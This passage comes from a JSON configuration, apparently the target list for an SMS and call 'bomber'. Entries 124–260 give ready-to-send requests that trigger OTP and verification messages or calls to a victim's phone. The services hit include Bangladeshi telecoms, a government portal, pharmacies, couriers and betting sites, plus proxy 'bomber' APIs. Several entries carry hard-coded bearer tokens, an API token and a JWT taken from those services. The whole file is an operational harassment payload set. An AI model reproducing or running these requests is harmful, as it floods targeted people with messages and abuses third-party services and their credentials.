  {"id":"124","name":"grameendh.php","url":"https://api.blackfire-tools.xyz/grameendh.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"125","name":"helth-login.php","url":"https://api.blackfire-tools.xyz/helth-login.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"126","name":"helth-reg.php","url":"https://api.blackfire-tools.xyz/helth-reg.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"127","name":"helth.php","url":"https://api.blackfire-tools.xyz/helth.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/json"}},
  {"id":"128","name":"hisab-express.php","url":"https://api.blackfire-tools.xyz/hisab-express.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"129","name":"hisabereg.php","url":"https://api.blackfire-tools.xyz/hisabereg.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"130","name":"hlpl.php","url":"https://api.blackfire-tools.xyz/hlpl.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"131","name":"hoichoi.php","url":"https://api.blackfire-tools.xyz/hoichoi.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"132","name":"iqra.php","url":"https://api.blackfire-tools.xyz/iqra.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"133","name":"ivr.php","url":"https://api.blackfire-tools.xyz/ivr.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"134","name":"jatri.php","url":"https://api.blackfire-tools.xyz/jatri.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"135","name":"jeetwinbd.php","url":"https://api.blackfire-tools.xyz/jeetwinbd.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"136","name":"jotno.php","url":"https://api.blackfire-tools.xyz/jotno.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"137","name":"kabbik.php","url":"https://api.blackfire-tools.xyz/kabbik.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"138","name":"kirebd.php","url":"https://api.blackfire-tools.xyz/kirebd.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"139","name":"kormi24.php","url":"https://api.blackfire-tools.xyz/kormi24.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"140","name":"lazzpharma.php","url":"https://api.blackfire-tools.xyz/lazzpharma.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"141","name":"ibfl.php","url":"https://api.blackfire-tools.xyz/ibfl.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"142","name":"loan.php","url":"https://api.blackfire-tools.xyz/loan.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"143","name":"mcbaffiliate.php","url":"https://api.blackfire-tools.xyz/mcbaffiliate.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"144","name":"mithai.php","url":"https://api.blackfire-tools.xyz/mithai.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"145","name":"mojaenglish.php","url":"https://api.blackfire-tools.xyz/mojaenglish.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"146","name":"mokam.php","url":"https://api.blackfire-tools.xyz/mokam.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/json"}},
  {"id":"147","name":"moveon.php","url":"https://api.blackfire-tools.xyz/moveon.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"148","name":"mygp.php","url":"https://api.blackfire-tools.xyz/mygp.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"149","name":"nbkash-gp.php","url":"https://api.blackfire-tools.xyz/nbkash-gp.php?phone=*****","method":"post","body":"","headers":{"content-type":"application/json"}},
  {"id":"150","name":"nbkash-ra.php","url":"https://api.blackfire-tools.xyz/nbkash-ra.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/json"}},
  {"id":"151","name":"nesco.php","url":"https://api.blackfire-tools.xyz/nesco.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"152","name":"niloyhero.php","url":"https://api.blackfire-tools.xyz/niloyhero.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"153","name":"obhai.php","url":"https://api.blackfire-tools.xyz/obhai.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"154","name":"ousodhpotro.php","url":"https://api.blackfire-tools.xyz/ousodhpotro.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"155","name":"paperflay.php","url":"https://api.blackfire-tools.xyz/paperflay.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"156","name":"pathao.php","url":"https://api.blackfire-tools.xyz/pathao.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"157","name":"portpos.php","url":"https://api.blackfire-tools.xyz/portpos.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"158","name":"pravanahelth.php","url":"https://api.blackfire-tools.xyz/pravanahelth.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"159","name":"qcom.php","url":"https://api.blackfire-tools.xyz/qcom.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"160","name":"quizgiri.php","url":"https://api.blackfire-tools.xyz/quizgiri.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"161","name":"quiztime.php","url":"https://api.blackfire-tools.xyz/quiztime.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"162","name":"redx.php","url":"https://api.blackfire-tools.xyz/redx.php?phone=*****","method":"post","body":"","headers":{"content-type":"application/json"}},
  {"id":"163","name":"redx2.php","url":"https://api.blackfire-tools.xyz/redx2.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"164","name":"reseller-circel.php","url":"https://api.blackfire-tools.xyz/reseller-circel.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"165","name":"robi-ivr-dorstep.php","url":"https://api.blackfire-tools.xyz/robi-ivr-dorstep.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"166","name":"robi-myoffer.php","url":"https://api.blackfire-tools.xyz/robi-myoffer.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"167","name":"robi-sim.php","url":"https://api.blackfire-tools.xyz/robi-sim.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"168","name":"robi-web.php","url":"https://api.blackfire-tools.xyz/robi-web.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"169","name":"robi-web2.php","url":"https://api.blackfire-tools.xyz/robi-web2.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"170","name":"rootsedu-forget.php","url":"https://api.blackfire-tools.xyz/rootsedu-forget.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"171","name":"rootsedu-reg.php","url":"https://api.blackfire-tools.xyz/rootsedu-reg.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"172","name":"rtv-forget.php","url":"https://api.blackfire-tools.xyz/rtv-forget.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"173","name":"rtv-reg.php","url":"https://api.blackfire-tools.xyz/rtv-reg.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"174","name":"runcash.php","url":"https://api.blackfire-tools.xyz/runcash.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"175","name":"sadhin.php","url":"https://api.blackfire-tools.xyz/sadhin.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"176","name":"sajgoj.php","url":"https://api.blackfire-tools.xyz/sajgoj.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"177","name":"saralifestyle.php","url":"https://api.blackfire-tools.xyz/saralifestyle.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"178","name":"sebaxyz.php","url":"https://api.blackfire-tools.xyz/sebaxyz.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"179","name":"senorbeuty.php","url":"https://api.blackfire-tools.xyz/senorbeuty.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"180","name":"sikho.php","url":"https://api.blackfire-tools.xyz/sikho.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"181","name":"skitto.php","url":"https://api.blackfire-tools.xyz/skitto.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"182","name":"somvob.php","url":"https://api.blackfire-tools.xyz/somvob.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"183","name":"sopoth-reg.php","url":"https://api.blackfire-tools.xyz/sopoth-reg.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"184","name":"sopoth-resend.php","url":"https://api.blackfire-tools.xyz/sopoth-resend.phpp?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"185","name":"stedfast.php","url":"https://api.blackfire-tools.xyz/stedfast.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"186","name":"sudokkho.php","url":"https://api.blackfire-tools.xyz/sudokkho.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"187","name":"sundarban.php","url":"https://api.blackfire-tools.xyz/sundarban.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"188","name":"talikhata.php","url":"https://api.blackfire-tools.xyz/talikhata.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"189","name":"tap.php","url":"https://api.blackfire-tools.xyz/tap.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"190","name":"thebodyshop.php","url":"https://api.blackfire-tools.xyz/thebodyshop.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"191","name":"tota.php","url":"https://api.blackfire-tools.xyz/tota.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"192","name":"toybox.php","url":"https://api.blackfire-tools.xyz/toybox.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"193","name":"trusty.php","url":"https://api.blackfire-tools.xyz/trusty.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"194","name":"win2gain.php","url":"https://api.blackfire-tools.xyz/win2gain.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"195","name":"babu88-capcha.php","url":"https://api.n1nx-bomber.my.id/call/babu88-forget.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"196","name":"babu88-capcha.php","url":"https://api.n1nx-bomber.my.id/call/babu88-reg.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/json"}},
  {"id":"197","name":"bhaggo-forget.php","url":"https://api.n1nx-bomber.my.id/call/bhaggo-forget.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"198","name":"bhaggo-reg.php","url":"https://api.n1nx-bomber.my.id/call/bhaggo-reg.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"199","name":"crazy-forget.php","url":"https://api.n1nx-bomber.my.id/call/crazy-forget.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"200","name":"crazy-reg.php","url":"https://api.n1nx-bomber.my.id/call/crazy-reg.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"201","name":"krikaya-forget.php","url":"https://api.n1nx-bomber.my.id/call/krikaya-forget.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"202","name":"krikaya-reg.php","url":"https://api.n1nx-bomber.my.id/call/krikaya-reg.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"203","name":"nagad88-forget.php","url":"https://api.n1nx-bomber.my.id/call/nagad88-forget.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"204","name":"nagad88-reg.php","url":"https://api.n1nx-bomber.my.id/call/nagad88-reg.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"205","name":"Call1","url":"https://api.blackfire-tools.xyz/call/babu88-forget.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"206","name":"call2","url":"https://api.blackfire-tools.xyz/call/babu88-reg.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"207","name":"call3","url":"https://api.blackfire-tools.xyz/call/bhaggo-forget.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"208","name":"Call4","url":"https://api.blackfire-tools.xyz/call/bhaggo-reg.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"209","name":"Call5","url":"https://api.blackfire-tools.xyz/call/crazy-forget.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"210","name":"Call6","url":"https://api.blackfire-tools.xyz/call/crazy-reg.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"211","name":"Call7","url":"https://api.blackfire-tools.xyz/call/krikaya-forget.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"212","name":"Call8","url":"https://api.blackfire-tools.xyZ/call/krikaya-reg.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"213","name":"Call9","url":"https://api.blackfire-tools.xyz/call/nagad88-forget.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"214","name":"Call10","url":"https://api.blackfire-tools.xyz/call/nagad88-reg.php?phone=*****","method":"get","body":"","headers":{"content-type":"application/x-www-form-urlencoded"}},
  {"id":"215","name":"BTCL MyBTCL","url":"https://mybtcl.btcl.gov.bd/api/ecare/anonym/sendOTP.json","method":"post","body":"{\"phoneNbr\":\"*****\",\"email\":\"\",\"OTPType\":1,\"userName\":\"\"}","headers":{"accept":"application/json","content-type":"application/json","origin":"https://mybtcl.btcl.gov.bd"}},
  {"id":"216","name":"BTCL PhoneBill","url":"https://phonebill.btcl.com.bd/api/bcare/anonym/sendOTP.json","method":"post","body":"{\"phoneNbr\":\"*****\",\"email\":\"\",\"OTPType\":1,\"userName\":\"\"}","headers":{"accept":"application/json","content-type":"application/json","origin":"https://phonebill.btcl.com.bd"}},
  {"id":"217","name":"Bioscope Plus","url":"https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en","method":"post","body":"{\"number\":\"+88*****\"}","headers":{"accept":"application/json","content-type":"application/json","origin":"https://www.bioscopeplus.com"}},
  {"id":"218","name":"BTCL BDIA","url":"https://bdia.btcl.com.bd/client/client/registrationMobVerification-2.jsp?moduleID=1","method":"post","body":"actionType=otpSend&mobileNo=0*****","headers":{"content-type":"application/x-www-form-urlencoded","origin":"https://bdia.btcl.com.bd"}},
  {"id":"219","name":"BD Tickets","url":"https://api.bdtickets.com:20100/v1/auth","method":"post","body":"{\"createUserCheck\":true,\"phoneNumber\":\"+88*****\",\"applicationChannel\":\"WEB_APP\"}","headers":{"accept":"application/json, text/plain, */*","content-type":"application/json","origin":"https://bdtickets.com"}},
  {"id":"220","name":"Apex4U","url":"https://api.apex4u.com/api/auth/login","method":"post","body":"{\"phoneNumber\":\"0*****\"}","headers":{"accept":"application/json, text/plain, */*","content-type":"application/json","origin":"https://apex4u.com"}},
  {"id":"221","name":"Swap.com.bd","url":"https://api.swap.com.bd/api/v1/send-otp/v2","method":"post","body":"{\"phone\":\"0*****\"}","headers":{"Accept":"application/json, text/plain, */*","Content-Type":"application/json","Origin":"https://swap.com.bd","signature":"JfhpbCI2A9NZt+WAfURnnns/34QgV05RT9vmQkUAcN0="}},
  {"id":"222","name":"Ilyn Global","url":"https://api.ilyn.global/auth/signup","method":"post","body":"{\"phone\":{\"code\":\"BD\",\"number\":\"+880*****\"},\"provider\":\"sms\"}","headers":{"accept":"application/json, text/plain, */*","content-type":"application/json","appcode":"ilyn-bd","origin":"https://ilyn.global"}},
  {"id":"223","name":"Arogga 3","url":"https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome&v=141.0.0.0&os=Windows&osv=10","method":"post","body":"mobile=0*****&fcmToken=&referral=","headers":{"accept":"*/*","content-type":"application/x-www-form-urlencoded","origin":"https://www.arogga.com"}},
  {"id":"224","name":"Fundesh 3","url":"https://fundesh.com.bd/api/auth/generateOTP?service_key=","method":"post","body":"{\"msisdn\":\"0*****\"}","headers":{"accept":"application/json, text/plain, */*","content-type":"application/json; charset=UTF-8","origin":"https://fundesh.com.bd"}},
  {"id":"225","name":"Garibook 3","url":"https://api.garibookadmin.com/api/v3/user/login","method":"post","body":"{\"mobile\":\"0*****\",\"recaptcha_token\":\"garibookcaptcha\",\"channel\":\"web\"}","headers":{"accept":"application/json","content-type":"application/json","Origin":"https://garibook.com"}},
  {"id":"226","name":"Sheba 3","url":"https://accountkit.sheba.xyz/api/shoot-otp","method":"post","body":"{\"mobile\":\"+88*****\",\"app_id\":\"8329815A6D1AE6DD\",\"api_token\":\"zYGYWdR5BjNrdNJm9M1xto3MjbVyl8QVoJviGrubR90Bn4L7TnvJPScfzxnH\"}","headers":{"accept":"application/json, text/plain, */*","content-type":"application/json;charset=UTF-8","custom-headers":"{\"portal-name\": \"Customer Web\"}","origin":"https://www.sheba.xyz"}},
  {"id":"227","name":"AppLink 3","url":"https://apps.applink.com.bd/appstore-v4-server/login/otp/request","method":"post","body":"{\"msisdn\":\"88*****\"}","headers":{"Accept":"*/*","Content-Type":"application/json","Origin":"https://applink.com.bd"}},
  {"id":"228","name":"Bikroy 3","url":"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0*****","method":"get","body":"","headers":{"accept":"application/json, text/plain, */*","accept-language":"bn","application-name":"web"}},
  {"id":"229","name":"MyGP Cinematic","url":"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/wap/+88*****","method":"post","body":"","headers":{"Accept":"application/json, text/plain, */*","Content-Type":"application/json;charset=UTF-8","Origin":"https://cinematic.mobi","Authorization":"Bearer 1pake4mh5ln64h5t26kpvm3iri"}},
  {"id":"230","name":"GP Web Login 3","url":"https://webloginda.grameenphone.com/backend/api/v1/otp","method":"post","body":"msisdn=0*****","headers":{"Accept":"application/json, text/plain, */*","Content-Type":"application/x-www-form-urlencoded","Origin":"https://www.grameenphone.com"}},
  {"id":"231","name":"Ghoori Learning","url":"https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web","method":"post","body":"{\"mobile_no\":\"0*****\"}","headers":{"accept":"application/json, text/plain, */*","content-type":"application/json","origin":"https://ghoorilearning.com"}},
  {"id":"232","name":"Deepto Play","url":"https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en","method":"post","body":"{\"number\":\"+880*****\"}","headers":{"accept":"application/json","content-type":"application/json","origin":"https://www.deeptoplay.com"}},
  {"id":"233","name":"ePharma","url":"https://epharma.com.bd/authentication/send-otp","method":"post","body":"number=+88*****","headers":{"accept":"*/*","content-type":"application/x-www-form-urlencoded; charset=UTF-8","origin":"https://epharma.com.bd","x-requested-with":"XMLHttpRequest"}},
  {"id":"234","name":"Sailor Clothing","url":"https://backend.sailor.clothing/api/v2/auth/password/forget_request","method":"post","body":"{\"email_or_phone\":\"0*****\",\"send_code_by\":\"phone\"}","headers":{"accept":"application/json","content-type":"application/json","authorization":"Bearer 5637987|3QACHH6dNkj2VMvQ6iJIPm5Ww8ML3pENjBgoChTr","origin":"https://sailor.clothing"}},
  {"id":"235","name":"Isho","url":"https://www.isho.com/register_otp","method":"post","body":"phone=0*****&email=test%40gmail.com","headers":{"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","content-type":"application/x-www-form-urlencoded","origin":"https://www.isho.com"}},
  {"id":"236","name":"MedEasy","url":"https://api.medeasy.health/api/send-otp/+88*****/,","method":"get","body":"","headers":{"accept":"application/json","origin":"https://medeasy.health"}},
  {"id":"237","name":"Osudpotro 3","url":"https://api.osudpotro.com/api/v1/users/send_otp","method":"post","body":"{\"mobile\":\"+88-*****\",\"deviceToken\":\"web\",\"language\":\"en\",\"os\":\"web\"}","headers":{"accept":"application/json, text/plain, */*","content-type":"application/json;charset=UTF-8","authorization":"Bearer undefined","origin":"https://osudpotro.com"}},
  {"id":"238","name":"TheClinicall","url":"https://theclinicall.com/bkapi/auth/user/otp/signin","method":"post","body":"{\"countryCode\":\"BD\",\"dialCode\":\"880\",\"phone\":\"*****\"}","headers":{"accept":"application/json","content-type":"application/json","authorization":"Bearer Hello","origin":"https://www.theclinicall.com"}},
  {"id":"239","name":"Shombhob","url":"https://shombhob.com/api/otp-login","method":"post","body":"{\"phone\":\"0*****\"}","headers":{"accept":"application/json, text/plain, */*","content-type":"application/json","origin":"https://shombhob.com","x-requested-with":"XMLHttpRequest"}},
  {"id":"240","name":"Care Box","url":"https://www.api-care-box.click/api/user/register/?version=otp","method":"post","body":"{\"Name\":\"Rakib Khan\",\"Phone\":\"+880*****\"}","headers":{"accept":"*/*","content-type":"application/json","origin":"https://www.care-box.com"}},
  {"id":"241","name":"Renix Care","url":"https://renixapi.renixcare.com/sms-api/send-otp","method":"post","body":"{\"phone\":\"0*****\"}","headers":{"accept":"*/*","content-type":"application/json","origin":"https://renixcare.com"}},
  {"id":"242","name":"Jayabaji Check Username","url":"https://www.jayabaji3.com/api/register/check-username","method":"post","body":"{\"username\":\"sojib12345\",\"email\":\"\",\"mobileno\":\"*****\",\"language\":\"bn\",\"langCountry\":\"bn-bd\"}","headers":{"accept":"application/json","content-type":"application/json","device":"desktop","domain":"www.jayabaji3.com","lang":"bn-bd","origin":"https://www.jayabaji3.com"}},
  {"id":"243","name":"PKLuck2 Register","url":"https://www.pkluck2.com/wps/verification/sms/register","method":"post","body":"{\"countryDialingCode\":\"880\",\"mobileNo\":\"0*****\"}","headers":{"Accept":"application/json, text/plain, */*","Content-Type":"application/json","Device":"web","Language":"BN","Merchant":"pklubdtf4","Origin":"https://www.pkluck2.com"}},
  {"id":"244","name":"PKLuck2 No Login","url":"https://www.pkluck2.com/wps/verification/sms/noLogin","method":"post","body":"{\"mobileNum\":\"0*****\",\"countryDialingCode\":\"880\"}","headers":{"Accept":"application/json, text/plain, */*","Content-Type":"application/json","Device":"web","Language":"BN","Merchant":"pklubdtf4","Origin":"https://www.pkluck2.com"}},
  {"id":"245","name":"GP Flexiplan","url":"https://gpwebms.grameenphone.com/api/v1/flexiplan-purchase/activation","method":"post","body":"{\"payment_mode\":\"mobile_balance\",\"longevity\":1,\"voice\":100,\"data\":0,\"fourg\":0,\"bioscope\":0,\"sms\":0,\"mca\":0,\"price\":69,\"msisdn\":\"0*****\",\"bundle_id\":60817,\"is_login\":false}","headers":{"Accept":"application/json, text/plain, */*","Authorization":"Bearer null","Content-Type":"application/json","Origin":"https://www.grameenphone.com"}},
  {"id":"246","name":"GP FWA","url":"https://gpfi-api.grameenphone.com/api/v1/fwa/request-for-otp","method":"post","body":"{\"phone\":\"0*****\",\"email\":\"\",\"language\":\"en\"}","headers":{"Accept":"application/json, text/plain, */*","Content-Type":"application/json","Origin":"https://gpfi.grameenphone.com"}},
  {"id":"247","name":"Mevrik","url":"https://channels.mevrik.com:4202/api/v1/claim-session","method":"post","body":"{\"data\":{\"user_ref\":\"0*****\",\"name\":\"MD Hossain\"}}","headers":{"Accept":"application/json","Content-Type":"text/plain","Origin":"https://chat.mevrik.com:4213","x-mevrik-token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOm51bGwsImNoYW5uZWwiOiJncC13ZWJzaXRlIiwibXNpc2RuIjoiOTcxOEE3NTctNjUwOC00NUM0LThEQ0EtQTgxRDhGQUYyMkI2IiwiZGV2aWNlX2lkIjoiZ2VuZXJpYyIsImlhdCI6MTc1OTg2NTMwMSwiaXNzIjoibWV2cmlrLmNvbSIsImV4cCI6MTc1OTg2NzEwMSwiaHR0cHM6XC9cL21ldnJpay5jb21cL2p3dFwvY2xhaW1zIjp7IngtbWV2cmlrLWFsbG93ZWQtcm9sZXMiOlsidXNlciJdfX0.O6gms45yShqhy3tj7Z97vCrgXY5h1EWcPbIGpaJBlmE"}},
  {"id":"248","name":"Priyoshikkhaloy","url":"https://app.priyoshikkhaloy.com/api/user/register-login.php","method":"post","body":"mobile=0*****","headers":{"User-Agent":"okhttp/4.11.0","Accept-Encoding":"gzip","Content-Type":"application/x-www-form-urlencoded"}},
  {"id":"249","name":"Paperfly Registration","url":"https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php","method":"post","body":"{\"full_name\":\"BILLAVAI\",\"company_name\":\"HARDBOMBER\",\"email_address\":\"pro@bomb.bd\",\"phone_number\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"250","name":"Ghoori Learning Signup OTP","url":"https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web","method":"post","body":"{\"mobile_no\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"251","name":"Doctime Send Auth OTP","url":"https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber","method":"post","body":"{\"data\":{\"country_calling_code\":\"88\",\"contact_no\":\"{phone}\",\"headers\":{\"PlatForm\":\"Web\"}}}","headers":{"Content-Type":"application/json"}},
  {"id":"252","name":"Sundarban Courier Access Token","url":"https://api-gateway.sundarbancourierltd.com/graphql","method":"post","body":"{\"operationName\":\"CreateAccessToken\",\"variables\":{\"accessTokenFilter\":{\"userName\":\"{phone}\"}},\"query\":\"mutation{createAccessToken(accessTokenFilter:{userName:\\\"{phone}\\\"}){message}}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"253","name":"Apex4u Login","url":"https://api.apex4u.com/api/auth/login","method":"post","body":"{\"phoneNumber\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"254","name":"Robi Doorstep OTP","url":"https://webapi.robi.com.bd/v1/send-otp","method":"post","body":"{\"phone_number\":\"{phone}\",\"type\":\"doorstep\"}","headers":{"Content-Type":"application/json","Authorization":"Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiJ9.5xbPa1JiodXeIST6v9c0f_4thF6tTBzaLLfuHlN7NSc"}},
  {"id":"255","name":"Banglalink Number Validation","url":"https://web-api.banglalink.net/api/v1/user/number/validation/{phone}","method":"get","body":"","headers":{}},
  {"id":"256","name":"Banglalink OTP Login Request","url":"https://web-api.banglalink.net/api/v1/user/otp-login/request","method":"post","body":"{\"mobile\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"257","name":"Grameenphone OTP","url":"https://webloginda.grameenphone.com/backend/api/v1/otp","method":"post","body":"msisdn={phone}","headers":{"Content-Type":"application/x-www-form-urlencoded"}},
  {"id":"258","name":"Robi My Offer OTP","url":"https://webapi.robi.com.bd/v1/send-otp","method":"post","body":"{\"phone_number\":\"{phone}\",\"type\":\"my_offer\"}","headers":{"Content-Type":"application/json"}},
  {"id":"259","name":"Robi DA NLL OTP","url":"https://da-api.robi.com.bd/da-nll/otp/send","method":"post","body":"{\"msisdn\":\"{phone}\"}","headers":{"Content-Type":"application/json"}},
  {"id":"260","name":"Robi Video Chat OTP","url":"https://webapi.robi.com.bd/v1/chat/send-otp","method":"post","body":"{\"phone_number\":\"{phone}\",\"name\":\"BILLAVAI\",\"type\":\"video-chat\"}","headers":{"Content-Type":"application/json"}},
